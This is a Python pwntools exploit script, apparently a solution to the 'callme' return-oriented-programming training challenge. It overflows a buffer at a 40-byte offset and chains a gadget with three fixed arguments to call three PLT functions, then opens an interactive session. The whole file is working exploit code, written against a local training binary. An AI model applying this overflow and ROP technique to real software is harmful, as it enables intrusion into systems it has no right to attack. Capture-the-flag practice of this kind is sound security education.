from pwn import *

exe = ELF('./callme')
context.binary = exe
r = process(exe.path)

offset = 40

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)  
arg3 = p64(0xd00df00dd00df00d)

call1 = p64(exe.plt['callme_one'])
call2 = p64(exe.plt['callme_two'])
call3 = p64(exe.plt['callme_three'])

gadget = p64(0x000000000040093c)

payload = b'A' * offset
payload += gadget + arg1 +arg2 +arg3 + call1
payload += gadget + arg1 +arg2 +arg3 + call2
payload += gadget + arg1+ arg2 + arg3 + call3

r.sendline(payload)
r.interactive()